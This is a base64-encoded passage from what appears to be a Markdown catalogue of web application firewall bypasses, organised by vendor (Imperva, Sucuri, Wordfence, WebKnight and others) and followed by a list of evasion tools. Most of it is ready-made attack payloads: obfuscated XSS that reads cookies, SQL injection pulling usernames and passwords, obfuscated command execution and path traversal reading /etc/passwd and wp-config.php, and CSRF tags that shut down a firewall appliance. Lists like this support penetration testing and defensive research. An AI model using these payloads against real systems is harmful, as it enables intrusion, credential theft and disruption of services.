d3d3LnRydXN0d2F2ZS5jb20vZW4tdXMvcmVzb3VyY2VzL2Jsb2dzL3NwaWRl
cmxhYnMtYmxvZy9tb2RzZWN1cml0eS1zcWwtaW5qZWN0aW9uLWNoYWxsZW5n
ZS1sZXNzb25zLWxlYXJuZWQvKSBieSBbQFNRTE1hcCBEZXZzXShodHRwOi8v
c3FsbWFwLnNvdXJjZWZvcmdlLm5ldC8jZGV2ZWxvcGVycykgKHYyLjIpCmBg
YAolNDAlNDBuZXclMjB1bmlvbiUyM3NxbG1hcHNxbG1hcC4uLiUwQXNlbGVj
dCUyMDEsMixkYXRhYmFzZSUyM3NxbG1hcCUwQSUyOCUyOQpgYGAKLSBbU1FM
aSBCeXBhc3NdKGh0dHBzOi8vd3d3LnRydXN0d2F2ZS5jb20vZW4tdXMvcmVz
b3VyY2VzL2Jsb2dzL3NwaWRlcmxhYnMtYmxvZy9tb2RzZWN1cml0eS1zcWwt
aW5qZWN0aW9uLWNoYWxsZW5nZS1sZXNzb25zLWxlYXJuZWQvKSBieSBbQEhh
Y2tQbGF5ZXJzXShodHRwOi8vdHdpdHRlci5jb20vIyEvaGFja3BsYXllcnMp
ICh2Mi4yKQpgYGAKJTBBc2VsZWN0JTIwMHgwMCUyQyUyMDB4NDElMjBub3Ql
MjBsaWtlJTJGKiUyMTAwMDAwdGFibGVfbmFtZSolMkYlMkMzJTIwZnJvbSUy
MGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMlMjBsaW1pdCUyMDEKYGBgCgoj
IyMgSW1wZXJ2YQotIFtYU1MgQnlwYXNzXShodHRwczovL3R3aXR0ZXIuY29t
L191Z3VyZXJjYW4vc3RhdHVzLzExODg0MDY3NjU3MzU2MzI4OTYpIGJ5IFtA
dWd1cmVyY2FuXShodHRwczovL3R3aXR0ZXIuY29tL191Z3VyZXJjYW4pCmBg
YAo8ZGV0YWlscy9vbnRvZ2dsZT0ic2VsZlsnd2luZCclMmInb3cnXVsnb25l
JyUyYidycm9yJ109c2VsZlsnd2luZCclMmInb3cnXVsnYWxlJyUyYidydCdd
O3Rocm93LyoqL3NlbGZbJ2RvYyclMmIndW1lbnQnXVsnZG9tYWluJ107Ii9v
cGVuPgpgYGAKLSBbSW1wZXJ2YSBTZWN1cmVTcGhlcmUgMTMgLSBSZW1vdGUg
Q29tbWFuZCBFeGVjdXRpb25dKGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29t
L2V4cGxvaXRzLzQ1NTQyKSBieSBbQHJzcDNhcl0oaHR0cHM6Ly93d3cuZXhw
bG9pdC1kYi5jb20vP2F1dGhvcj05Mzk2KQotIFhTUyBCeXBhc3MgYnkgW0BE
YXZpZCBZXShodHRwczovL3R3aXR0ZXIuY29tL2RhdmV5c2VjKQpgYGAKPHN2
ZyBvbmxvYWRcclxuPSQuZ2xvYmFsRXZhbCgiYWwiKyJlcnQoKSIpOz4KYGBg
Ci0gWFNTIEJ5cGFzcyBieSBbQEVtYWQgU2hhbmFiXShodHRwczovL3R3aXR0
ZXIuY29tL2FscmEzZWVzKQpgYGAKPHN2Zy9vbmxvYWQ9c2VsZltgYWxlcmAl
MmJgdGBdYDFgPgphbnl0aGluZ2xyMDAlM2MlMmZzY3JpcHQlM2UlM2NzY3Jp
cHQlM2VhbGVydChkb2N1bWVudC5kb21haW4pJTNjJTJmc2NyaXB0JTNldXhs
ZHoKYGBgCi0gWFNTIEJ5cGFzcyBieSBbQFdBRk5pbmphXShodHRwczovL3dh
Zi5uaW5qYSkKYGBgCiUzQ2ltZyUyRnNyYyUzRCUyMnglMjIlMkZvbmVycm9y
JTNEJTIycHJvbSU1Q3UwMDcwdCUyNTI2JTI1MjN4MjglM0IlMjUyNiUyNTIz
eDI3JTNCJTI1MjYlMjUyM3g1OCUzQiUyNTI2JTI1MjN4NTMlM0IlMjUyNiUy
NTIzeDUzJTNCJTI1MjYlMjUyM3gyNyUzQiUyNTI2JTI1MjN4MjklM0IlMjIl
M0UKYGBgCi0gWFNTIEJ5cGFzcyBieSBbQGlfYm8wb21dKGh0dHBzOi8vdHdp
dHRlci5jb20vaV9ibzBvbSkKYGBgCjxpZnJhbWUvb25sb2FkPSd0aGlzWyJz
cmMiXT0iamF2YXMmVGFiO2NyaXB0OmFsIisiZXJ0YGAiJzs+CjxpbWcvc3Jj
PXEgb25lcnJvcj0nbmV3IEZ1bmN0aW9uYGFsXGVydFxgMVxgYCc+CmBgYAot
IFhTUyBCeXBhc3MgYnkgW0BjMGQzZzMza10oaHR0cHM6Ly90d2l0dGVyLmNv
bS9jMGQzZzMzaykKYGBgCjxvYmplY3QgZGF0YT0nZGF0YTp0ZXh0L2h0bWw7
Ozs7O2Jhc2U2NCxQSE5qY21sd2RENWhiR1Z5ZENneEtUd3ZjMk55YVhCMFBn
PT0nPjwvb2JqZWN0PgpgYGAKLSBTUUxpIEJ5cGFzcyBieSBbQERSSzFXSV0o
aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vP2F1dGhvcj03NzQwKQpgYGAK
MTUgYW5kICcxJz0oU0VMRUNUICcxJyBGUk9NIGR1YWwpIGFuZCAnMGhhdmlu
Zyc9JzBoYXZpbmcnCmBgYAotIFNRTGkgYnkgW0BHaXVzZXBwZSBEJ0Ftb3Jl
XShodHRwczovL3d3dy5leHBsb2l0LWRiLmNvbS8/YXV0aG9yPTY0MTMpCmBg
YApzdHJpbmdpbmRhdGFzZXRjaG9vc2VuJSUnIGFuZCAxID0gYW55IChzZWxl
Y3QgMSBmcm9tIFNFQ1VSRS5DT05GX1NFQ1VSRV9NRU1CRVJTIHdoZXJlIEZV
TExfTkFNRSBsaWtlICclJWRtaW5pc3RyYXRvcicgYW5kIHJvd251bTw9MSBh
bmQgUEFTU1dPUkQgbGlrZSAnMCUnKSBhbmQgJzElJSc9JzEKYGBgCi0gW0lt
cGVydmEgU2VjdXJlU3BoZXJlIDw9IHYxMyAtIFByaXZpbGVnZSBFc2NhbGF0
aW9uXShodHRwczovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy80NTEz
MCkgYnkgW0AweDA5QUxdKGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29tLz9h
dXRob3I9ODk5MSkKCiMjIyBLb25hIFNpdGVEZWZlbmRlcgotIFtYU1MgQnlw
YXNzXShodHRwczovL3R3aXR0ZXIuY29tL2gxX2tlbmFuL3N0YXR1cy8xMTg1
ODI2MTcyMzA4OTgzODA4KSBieSBbQGgxX2tlbmFuXShodHRwczovL3R3aXR0
ZXIuY29tL2gxX2tlbmFuKQpgYGAKYXNkIm9uKzw+K29ucG9pbnRlcmVudGVy
JTNkInglM2Rjb25maXJtLHgoY29va2llKQpgYGAKIC0gW0hUTUwgSW5qZWN0
aW9uXShodHRwczovL2hhY2tlcm9uZS5jb20vcmVwb3J0cy8yNjMyMjYpIGJ5
IFtAc3AxZDNyc10oaHR0cHM6Ly90d2l0dGVyLmNvbS9oMV9zcDFkM3JzKQpg
YGAKJTI1MjIlMjUzRSUyNTNDc3ZnJTI1MjBoZWlnaHQlM0QlMjUyMjEwMCUy
NTIyJTI1MjB3aWR0aCUzRCUyNTIyMTAwJTI1MjIlMjUzRSUyNTIwJTI1M0Nj
aXJjbGUlMjUyMGN4JTNEJTI1MjI1MCUyNTIyJTI1MjBjeSUzRCUyNTIyNTAl
MjUyMiUyNTIwciUzRCUyNTIyNDAlMjUyMiUyNTIwc3Ryb2tlJTNEJTI1MjJi
bGFjayUyNTIyJTI1MjBzdHJva2Utd2lkdGglM0QlMjUyMjMlMjUyMiUyNTIw
ZmlsbCUzRCUyNTIycmVkJTI1MjIlMjUyMCUyRiUyNTNFJTI1MjAlMjUzQyUy
RnN2ZyUyNTNFCmBgYAotIFtYU1MgQnlwYXNzXShodHRwczovL21lZGl1bS5j
b20vQGpvbmF0aGFuYm91bWFuL3JlZmxlY3RlZC14c3MtYXQtcGhpbGlwcy1j
b20tZTQ4YmY4ZjljZDNjKSBieSBbQEpvbmF0aGFuIEJvdW1hbl0oaHR0cHM6
Ly90d2l0dGVyLmNvbS9qb25hdGhhbmJvdW1hbikKYGBgCjxib2R5JTIwYWx0
PWFsJTIwbGFuZz1lcnQlMjBvbm1vdXNlZW50ZXI9InRvcFsnYWwnK2xhbmdd
KC9Qb0MlMjBYU1MlMjBCeXBhc3MlMjBieSUyMEpvbmF0aGFuJTIwQm91bWFu
LykiCmBgYAotIFtYU1MgQnlwYXNzXShodHRwczovL3R3aXR0ZXIuY29tL1hz
c1BheWxvYWRzL3N0YXR1cy8xMDA4NTczNDQ0ODQwMTk4MTQ0P3M9MjApIGJ5
IFtAenNlYW5vXShodHRwczovL3R3aXR0ZXIuY29tL3pzZWFubykKYGBgCj8i
Pjwvc2NyaXB0PjxiYXNlJTIwYyUzRD1ocmVmJTNEaHR0cHM6XG15c2l0ZT4K
YGBgCi0gWFNTIEJ5cGFzcyBieSBbQDB4SW5mZWN0aW9uXShodHRwczovL3R3
aXR0ZXIuY29tLzB4SW5mZWN0aW9uKQpgYGAKPGFiYy9vbm1vdXNlZW50ZXI9
Y29uZmlybSU2MCU2MD4KYGBgCi0gW1hTUyBCeXBhc3NdKGh0dHBzOi8vaGFj
a2Vyb25lLmNvbS9yZXBvcnRzLzI2MzIyNikgYnkgW0BzcDFkM3JzXShodHRw
czovL3R3aXR0ZXIuY29tL2gxX3NwMWQzcnMpCmBgYAolMjUyMiUyNTNFJTI1
M0MlMkZkaXYlMjUzRSUyNTNDJTJGZGl2JTI1M0UlMjUzQ2JydXRlJTI1MjBv
bmJlZm9yZXNjcmlwdGV4ZWN1dGUlM0QlMjUyN2NvbmZpcm0lMjhkb2N1bWVu
dC5kb21haW4lMjklMjUyNyUyNTNFCmBgYAotIFtYU1MgQnlwYXNzXShodHRw
czovL3R3aXR0ZXIuY29tL2ZyYW5zcm9zZW4vc3RhdHVzLzExMjY5NjM1MDY3
MjM1OTAxNDgpIGJ5IFtARnJhbnMgUm9zw6luXShodHRwczovL3R3aXR0ZXIu
Y29tL2ZyYW5zcm9zZW4pCmBgYAo8c3R5bGU+QGtleWZyYW1lcyBhe31ie2Fu
aW1hdGlvbjphO308L3N0eWxlPjxiL29uYW5pbWF0aW9uc3RhcnQ9cHJvbXB0
YCR7ZG9jdW1lbnQuZG9tYWlufSYjeDYwOz4KYGBgCi0gW1hTUyBCeXBhc3Nd
KGh0dHBzOi8vdHdpdHRlci5jb20vc2VjdXJpdHlfcHJpbmNlL3N0YXR1cy8x
MTI3ODA0NTIxMzE1NDI2MzA0KSBieSBbQElzaGFxIE1vaGFtbWVkXShodHRw
czovL3R3aXR0ZXIuY29tL3NlY3VyaXR5X3ByaW5jZSkKYGBgCjxtYXJxdWVl
K2xvb3A9MSt3aWR0aD0wK29uZmluaXNoPSduZXcrRnVuY3Rpb25gYWxcZXJ0
XGAxXGBgJz4KYGBgCgojIyMgUHJvZmVuc2UKLSBbR0VUIFR5cGUgQ1NSRiBB
dHRhY2tdKGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzc5
MTkpIGJ5IFtATWljaGFlbCBCcm9va3NdKGh0dHBzOi8vd3d3LmV4cGxvaXQt
ZGIuY29tLz9hdXRob3I9NjI4KSAoPj0gdi4yLjYuMikKClR1cm4gb2ZmIFBy
b2ZhY2UgTWFjaGluZSAKYGBgCjxpbWcgc3JjPWh0dHBzOi8vaG9zdDoyMDAw
L2FqYXguaHRtbD9hY3Rpb249c2h1dGRvd24+CmBgYApBZGQgYSBwcm94eQpg
YGAKPGltZyBzcmM9aHR0cHM6Ly8xMC4xLjEuMTk5OjIwMDAvYWpheC5odG1s
P3Zob3N0X3Byb3RvPWh0dHAmdmhvc3Q9dmhvc3QuY29tJnZob3N0X3BvcnQ9
ODAmcmhvc3RfcHJvdG89aHR0cCZyaG9zdD0xMC4xLjEuMSZyaG9zdF9wb3J0
PTgwJm1vZGVfcGFzcz1vbiZ4bWxlPW9uJmVuYWJsZV9maWxlX3VwbG9hZD1v
biZzdGF0aWNfcGFzc3Rocm91Z2g9b24mYWN0aW9uPWFkZCZkbz1zYXZlPgpg
YGAKCi0gWFNTIEJ5cGFzcyBieSBbQE1pY2hhZWwgQnJvb2tzXShodHRwczov
L3d3dy5leHBsb2l0LWRiLmNvbS8/YXV0aG9yPTYyOCkgKD49IHYuMi42LjIp
CmBgYApodHRwczovL2hvc3Q6MjAwMC9wcm94eS5odG1sP2FjdGlvbj1tYW5h
Z2UmbWFpbj1sb2cmc2hvdz1kZW55X2xvZyZwcm94eT0+IjxzY3JpcHQ+YWxl
cnQoZG9jdW1lbnQuY29va2llKTwvc2NyaXB0PgpgYGAKLSBbWFNTIEJ5cGFz
c10oaHR0cHM6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzM1MDUzL2lu
Zm8pIGJ5IFtARW5hYmxlU2VjdXJpdHldKGh0dHBzOi8vZW5hYmxlc2VjdXJp
dHkuY29tKSAoPj0gdjIuNCkKYGBgCiUzQ0V2aWwlMjBzY3JpcHQlMjBnb2Vz
JTIwaGVyZSUzRT0lMEFCeVBhc3MKJTNDc2NyaXB0JTNFYWxlcnQoZG9jdW1l
bnQuY29va2llKSUzQy9zY3JpcHQlMjBCeVBhc3MlM0UgCmBgYAoKIyMjIFF1
aWNrRGVmZW5zZQotIFhTUyBCeXBhc3MgYnkgW0BXQUZOaW5qYV0oaHR0cHM6
Ly93YWYubmluamEvKQpgYGAKPzxpbnB1dCB0eXBlPSJzZWFyY2giIG9uc2Vh
cmNoPSJhbGVyXHUwMDc0KDEpIj4KPGRldGFpbHMgb250b2dnbGU9YWxlcnQo
MSk+CmBgYAoKIyMjIFN1Y3VyaQotIFtTbXVnZ2xpbmcgUkNFIFBheWxvYWRz
XShodHRwczovL21lZGl1bS5jb20vc2VjanVpY2Uvd2FmLWV2YXNpb24tdGVj
aG5pcXVlcy03MTgwMjZkNjkzZDgpIGJ5IFtAdGhlTWlkZGxlXShodHRwczov
L3R3aXR0ZXIuY29tL01lbmluX1RoZU1pZGRsZSkKYGBgCi8/Pz8vPz90Ky8/
Pz8vPz9zcz8/CmBgYAotIFtPYmZ1c2NhdGluZyBSQ0UgUGF5bG9hZHNdKGh0
dHBzOi8vbWVkaXVtLmNvbS9zZWNqdWljZS93ZWItYXBwbGljYXRpb24tZmly
ZXdhbGwtd2FmLWV2YXNpb24tdGVjaG5pcXVlcy0yLTEyNTk5NWYzZTdiMCkg
YnkgW0B0aGVNaWRkbGVdKGh0dHBzOi8vdHdpdHRlci5jb20vTWVuaW5fVGhl
TWlkZGxlKQpgYGAKOytjYXQrL2UndGMvcGFzcyd3ZApjXFxhXFx0Ky9ldFxc
Yy9wYXNcXHN3ZApgYGAKLSBbWFNTIEJ5cGFzc10oaHR0cHM6Ly90d2l0dGVy
LmNvbS9yZXR1cm5fMHgvc3RhdHVzLzExNDg2MDU2MjcxODAyMDgxMjkpIGJ5
IFtATHVrYV0oaHR0cHM6Ly90d2l0dGVyLmNvbS9yZXR1cm5fMHgpCmBgYAoi
PjxpbnB1dC9vbmF1eGNsaWNrPSJbMV0ubWFwKHByb21wdCkiPgpgYGAKLSBb
WFNTIEJ5cGFzc10oaHR0cHM6Ly90d2l0dGVyLmNvbS9icnV0ZWxvZ2ljL3N0
YXR1cy8xMTQ4NjEwMTA0NzM4MDk5MjAxKSBieSBbQEJydXRlIExvZ2ljXSho
dHRwczovL3R3aXR0ZXIuY29tL2JydXRlbG9naWMpCmBgYApkYXRhOnRleHQv
aHRtbCw8Zm9ybSBhY3Rpb249aHR0cHM6Ly9icnV0ZWxvZ2ljLmNvbS5ici94
c3MtY3AucGhwIG1ldGhvZD1wb3N0Pgo8aW5wdXQgdHlwZT1oaWRkZW4gbmFt
ZT1hIHZhbHVlPSI8aW1nL3NyYz0vL2tub3hzcy5tZS95dC5qcGcgb25wb2lu
dGVyZW50ZXI9YWxlcnRgMWA+Ij4KPGlucHV0IHR5cGU9c3VibWl0PjwvZm9y
bT4KYGBgCgojIyMgVVJMU2NhbgotIFtEaXJlY3RvcnkgVHJhdmVyc2FsXSho
dHRwczovL2dpdGh1Yi5jb20vMHhJbmZlY3Rpb24vQXdlc29tZS1XQUYvYmxv
Yi9tYXN0ZXIvcGFwZXJzL0JleW9uZCUyMFNRTGklMjAtJTIwT2JmdXNjYXRl
JTIwYW5kJTIwQnlwYXNzJTIwV0FGcy50eHQjTDU1NykgYnkgW0BaZVEzdUxd
KGh0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vYXV0aG9yLz9hPTEyNzUpICg8
PSB2My4xKSAoT25seSBvbiBBU1AuTkVUKQpgYGAKaHR0cDovL2hvc3QuY29t
L3Rlc3QuYXNwP2ZpbGU9LiUuL2JsYS50eHQKYGBgCgojIyMgV2ViQVJYCi0g
Q3Jvc3MgU2l0ZSBTY3JpcHRpbmcgYnkgW0AweEluZmVjdGlvbl0oaHR0cHM6
Ly90d2l0dGVyLmNvbS8weGluZmVjdGlvbikKYGBgCjxhNjkvb25hdXhjbGlj
az1vcGVuJiM0MCYjNDE+cmlnaHRjbGlja2hlcmUKYGBgCi0gW0J5cGFzc2lu
ZyBBbGwgUHJvdGVjdGlvbnMgVXNpbmcgQSBXaGl0ZWxpc3QgU3RyaW5nXSho
dHRwczovL29zYW5kYW1hbGl0aC5jb20vMjAxOS8xMC8xMi9ieXBhc3Npbmct
dGhlLXdlYmFyeC13ZWItYXBwbGljYXRpb24tZmlyZXdhbGwtd2FmLykgYnkg
W0BPc2FuZGEgTWFsaXRoXShodHRwczovL3R3aXR0ZXIuY29tL09zYW5kYU1h
bGl0aCkKCiAgICAtIFhTUyBQb0MKICAgIGBgYAogICAgaHR0cDovL2hvc3Qu
Y29tLz92dWxucGFyYW09PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+Jml0aGVt
ZXMtc3luYy1yZXF1ZXN0CiAgICBgYGAKICAgIC0gTEZJIFBvQwogICAgYGBg
CiAgICBodHRwOi8vaG9zdC5jb20vP3Z1bG5wYXJhbT0uLi8uLi8uLi8uLi8u
Li9ldGMvcGFzc3dkJml0aGVtZXMtc3luYy1yZXF1ZXN0CiAgICBgYGAKICAg
IC0gU1FMaSBQb0MKICAgIGBgYAogICAgaHR0cDovL2hvc3QuY29tLz92dWxu
cGFyYW09MSUyMHVuaW9uc2VsZWN0JTIwQEB2ZXJzaW9uLDItLSZpdGhlbWVz
LXN5bmMtcmVxdWVzdAogICAgYGBgCgojIyMgV2ViS25pZ2h0Ci0gQ3Jvc3Mg
U2l0ZSBTY3JpcHRpbmcgYnkgW0BXQUZOaW5qYV0oaHR0cHM6Ly93YWYubmlu
amEvKQpgYGAKPGlzaW5kZXggYWN0aW9uPWomVGFiO2EmVGFiO3ZhcyZUYWI7
YyZUYWI7ciZUYWI7aXB0OmFsZXJ0KDEpIHR5cGU9aW1hZ2U+CjxtYXJxdWVl
L29uc3RhcnQ9Y29uZmlybSgyKT4KPGRldGFpbHMgb250b2dnbGU9YWxlcnQo
MSk+CjxkaXYgY29udGV4dG1lbnU9InhzcyI+UmlnaHQtQ2xpY2sgSGVyZTxt
ZW51IGlkPSJ4c3MiIG9uc2hvdz0iYWxlcnQoMSkiPgo8aW1nIHNyYz14IG9u
d2hlZWw9cHJvbXB0KDEpPgpgYGAKLSBTUUxpIGJ5IFtAV0FGTmluamFdKGh0
dHBzOi8vd2FmLm5pbmphKQpgYGAKMCB1bmlvbihzZWxlY3QgMSx1c2VybmFt
ZSxwYXNzd29yZCBmcm9tKHVzZXJzKSkKMCB1bmlvbihzZWxlY3QgMSxAQGhv
c3RuYW1lLEBAZGF0YWRpcikKYGBgCi0gWFNTIEJ5cGFzcyBieSBbQEFhdGlm
IEtoYW5dKGh0dHBzOi8vdHdpdHRlci5jb20vdGhlbmFwc3RlcmtoYW4pICh2
NC4xKQpgYGAKPGRldGFpbHMgb250b2dnbGU9YWxlcnQoMSk+CjxkaXYgY29u
dGV4dG1lbnU9InhzcyI+UmlnaHQtQ2xpY2sgSGVyZTxtZW51IGlkPSJ4c3Mi
IG9uc2hvdz0iYWxlcnQoMSkiPgpgYGAKLSBbU1FMaSBCeXBhc3NdKGh0dHBz
Oi8vZ2l0aHViLmNvbS8weEluZmVjdGlvbi9Bd2Vzb21lLVdBRi9ibG9iL21h
c3Rlci9wYXBlcnMvQmV5b25kJTIwU1FMaSUyMC0lMjBPYmZ1c2NhdGUlMjBh
bmQlMjBCeXBhc3MlMjBXQUZzLnR4dCNMNTYyKSBieSBbQFplUTN1TF0oaHR0
cDovL3d3dy5leHBsb2l0LWRiLmNvbS9hdXRob3IvP2E9MTI3NSkKYGBgCjEw
IGElbmQgMT0wLyhzZSVsZWN0IHRvcCAxIHRhJWJsZV9uYW1lIGZyJW9tIGlu
Zm8lcm1hdGlvbl9zY2hlbWEudGFibGVzKQpgYGAKCiMjIyBXb3JkZmVuY2UK
LSBYU1MgQnlwYXNzIGJ5IFtAYnJ1dGUgTG9naWNdKGh0dHBzOi8vdHdpdHRl
ci5jb20vYnJ1dGVsb2dpYykKYGBgCjxhIGhyZWY9amF2YXMmIzk5O3JpcHQ6
YWxlcnQoMSk+CmBgYAotIFhTUyBCeXBhc3MgYnkgW0AweEluZmVjdGlvbl0o
aHR0cHM6Ly90d2l0dGVyLmNvbS8weEluZmVjdGlvbikKYGBgCjxhLyoqL2hy
ZWY9aiUwQWElMEF2JTBBYSUwQXMlMEFjJTBBciUwQWklMEFwJTBBdCZjb2xv
bjsvKiovYWxlcnQoKS8qKi8+Y2xpY2sKYGBgCi0gW0hUTUwgSW5qZWN0aW9u
XShodHRwczovL3d3dy5zZWN1cml0eWZvY3VzLmNvbS9iaWQvNjk4MTUvaW5m
bykgYnkgW0BWb3hlbF0oaHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vP2F1
dGhvcj04NTA1KQpgYGAKaHR0cDovL2hvc3Qvd3AtYWRtaW4vYWRtaW4tYWph
eC5waHA/YWN0aW9uPXJldnNsaWRlcl9zaG93X2ltYWdlJmltZz0uLi93cC1j
b25maWcucGhwCmBgYAotIFtYU1MgRXhwbG9pdF0oaHR0cHM6Ly93d3cuc2Vj
dXJpdHlmb2N1cy5jb20vYmlkLzU2MTU5L2luZm8pIGJ5IFtATXVzdExpdmVd
KGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29tLz9hdXRob3I9MTI5MykgKD49
IHYzLjMuNSkKYGBgCjxodG1sPgo8aGVhZD4KPHRpdGxlPldvcmRmZW5jZSBT
ZWN1cml0eSBYU1MgZXhwbG9pdCAoQykgMjAxMiBNdXN0TGl2ZS4gCmh0dHA6
Ly93ZWJzZWN1cml0eS5jb20udWE8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IG9u
TG9hZD0iZG9jdW1lbnQuaGFjay5zdWJtaXQoKSI+Cjxmb3JtIG5hbWU9Imhh
Y2siIGFjdGlvbj0iaHR0cDovL3NpdGUvP193ZnNmPXVubG9ja0VtYWlsIiBt
ZXRob2Q9InBvc3QiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJlbWFp
bCIgCnZhbHVlPSI8c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmNvb2tpZSk8L3Nj
cmlwdD4iPgo8L2Zvcm0+CjwvYm9keT4KPC9odG1sPgpgYGAKLSBbT3RoZXIg
WFNTIEJ5cGFzc2VzXShodHRwczovL2dpdGh1Yi5jb20vRWRPdmVyZmxvdy9i
dWdib3VudHktY2hlYXRzaGVldC9ibG9iL21hc3Rlci9jaGVhdHNoZWV0cy94
c3MubWQpCmBgYAo8bWV0ZXIgb25tb3VzZW92ZXI9ImFsZXJ0KDEpIgonIj4+
PGRpdj48bWV0ZXIgb25tb3VzZW92ZXI9ImFsZXJ0KDEpIjwvZGl2PiIKPj48
bWFycXVlZSBsb29wPTEgd2lkdGg9MCBvbmZpbmlzaD1hbGVydCgxKT4KYGBg
CgojIyMgQXBhY2hlIEdlbmVyaWMKLSBXcml0aW5nIG1ldGhvZCB0eXBlIGlu
IGxvd2VyY2FzZSBieSBbQGlfYm8wb21dKGh0dHA6Ly90d2l0dGVyLmNvbS9p
X2JvMG9tKQpgYGAKZ2V0IC9sb2dpbiBIVFRQLzEuMQpIb3N0OiBmYXZvcml0
ZXdhZi5jb20KVXNlci1BZ2VudDogTW96aWxsYS80LjAgKGNvbXBhdGlibGU7
IE1TSUU1LjAxOyBXaW5kb3dzIE5UKQpgYGAKCiMjIyBJSVMgR2VuZXJpYwot
IFRhYnMgYmVmb3JlIG1ldGhvZCBieSBbQGlfYm8wb21dKGh0dHA6Ly90d2l0
dGVyLmNvbS9pX2JvMG9tKQpgYGAKICAgIEdFVCAvbG9naW4ucGhwIEhUVFAv
MS4xCkhvc3Q6IGZhdm9yaXRld2FmLmNvbQpVc2VyLUFnZW50OiBNb3ppbGxh
LzQuMCAoY29tcGF0aWJsZTsgTVNJRTUuMDE7IFdpbmRvd3MgTlQpCmBgYAoK
IyMgQXdlc29tZSBUb29scwojIyMgRmluZ2VycHJpbnRpbmc6Ci0gW1dBRlcw
MEZdKGh0dHBzOi8vZ2l0aHViLmNvbS9lbmFibGVzZWN1cml0eS93YWZ3MDBm
KSAtIFRoZSB1bHRpbWF0ZSBXQUYgZmluZ2VycHJpbnRpbmcgdG9vbCB3aXRo
IHRoZSBsYXJnZXN0IGZpbmdlcnByaW50IGRhdGFiYXNlIGZyb20gW0BFbmFi
bGVTZWN1cml0eV0oaHR0cHM6Ly9naXRodWIuY29tL2VuYWJsZXNlY3VyaXR5
KS4KLSBbSWRlbnRZd2FmXShodHRwczovL2dpdGh1Yi5jb20vc3RhbXBhcm0v
aWRlbnR5d2FmKSAtIEEgYmxpbmQgV0FGIGRldGVjdGlvbiB0b29sIHdoaWNo
IHV0bGlzZXMgYSB1bmlxdWUgbWV0aG9kIG9mIGlkZW50aWZ5aW5nIFdBRnMg
YmFzZWQgdXBvbiBwcmV2aW91c2x5IGNvbGxlY3RlZCBmaW5nZXJwcmludHMg
YnkgW0BzdGFtcGFybV0oaHR0cHM6Ly9naXRodWIuY29tL3N0YW1wYXJtKS4K
CiMjIyBUZXN0aW5nOgotIFtMaWdodGJ1bGIgRnJhbWV3b3JrXShodHRwczov
L2dpdGh1Yi5jb20vbGlnaHRidWxiLWZyYW1ld29yay9saWdodGJ1bGItZnJh
bWV3b3JrKSAtIEEgV0FGIHRlc3Rpbmcgc3VpdGUgd3JpdHRlbiBpbiBQeXRo
b24uCi0gW1dBRkJlbmNoXShodHRwczovL2dpdGh1Yi5jb20vbWljcm9zb2Z0
L3dhZmJlbmNoKSAtIEEgV0FGIHBlcmZvcm1hbmNlIHRlc3Rpbmcgc3VpdGUg
YnkgW01pY3Jvc29mdF0oaHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdCku
Ci0gW1dBRiBUZXN0aW5nIEZyYW1ld29ya10oaHR0cHM6Ly93d3cuaW1wZXJ2
YS5jb20vbGcvbGd3X3RyaWFsLmFzcD9waWQ9NDgzKSAtIEEgV0FGIHRlc3Rp
bmcgdG9vbCBieSBbSW1wZXJ2YV0oaHR0cHM6Ly9pbXBlcnZhLmNvbSkuCgoj
IyMgRXZhc2lvbjogIAotIFtXQUZOaW5qYV0oaHR0cHM6Ly9naXRodWIuY29t
L2toYWxpbGJpampvdS93YWZuaW5qYSkgLSBBIHNtYXJ0IHRvb2wgd2hpY2gg
ZnV6emVzIGFuZCBjYW4gc3VnZ2VzdCBieXBhc3NlcyBmb3IgYSBnaXZlbiBX
QUYgYnkgW0BraGFsaWxiaWpqb3VdKGh0dHBzOi8vZ2l0aHViLmNvbS9raGFs
aWxiaWpqb3UvKS4KLSBbV0FGVGVzdGVyXShodHRwczovL2dpdGh1Yi5jb20v
UmF6MHIvd2FmdGVzdGVyKSAtIEFub3RoZXIgdG9vbCB3aGljaCBjYW4gb2Jm
dXNjYXRlIHBheWxvYWRzIHRvIGJ5cGFzcyBXQUZzIGJ5IFtAUmF6MHJdKGh0
dHBzOi8vZ2l0aHViLmNvbS9SYXowci8pLgotIFtsaWJpbmplY3Rpb24tZnV6
emVyXShodHRwczovL2dpdGh1Yi5jb20vbWlnb2xvdmFub3YvbGliaW5qZWN0
aW9uLWZ1enplcikgLSBBIGZpenplciBpbnRlbmRlZCBmb3IgZmluZGluZyBg
bGliaW5qZWN0aW9uYCBieXBhc3NlcyBidXQgY2FuIGJlIHByb2JhYmx5IHVz
ZWQgdW5pdmVyc2FsbHkuCi0gW2J5cGFzcy1maXJld2FsbHMtYnktRE5TLWhp
c3RvcnldKGh0dHBzOi8vZ2l0aHViLmNvbS92aW5jZW50Y294L2J5cGFzcy1m
aXJld2FsbHMtYnktRE5TLWhpc3RvcnkpIC0gIEEgdG9vbCB3aGljaCBzZWFy
Y2hlcyBmb3Igb2xkIEROUyByZWNvcmRzIGZvciBmaW5kaW5nIGFjdHVhbCBz
aXRlIGJlaGluZCB0aGUgV0FGLgotIFthYnVzZS1zc2wtYnlwYXNzLXdhZl0o
aHR0cHM6Ly9naXRodWIuY29tL0xhbmRHcmV5L2FidXNlLXNzbC1ieXBhc3Mt
d2FmKSAtIEEgdG9vbCB3aGljaCBmaW5kcyBvdXQgc3VwcG9ydGVkIFNTTC9U
TFMgY2lwaGVycyBhbmQgaGVscHMgaW4gZXZhZGluZyBXQUZzLgotIFtTUUxN
YXAgVGFtcGVyIFNjcmlwdHNdKGh0dHBzOi8vZ2l0aHViLmNvbS9zcWxtYXBw
cm9qZWN0L3NxbG1hcCkgLSBUYW1wZXIgc2NyaXB0cyBpbiBTUUxNYXAgb2Jm
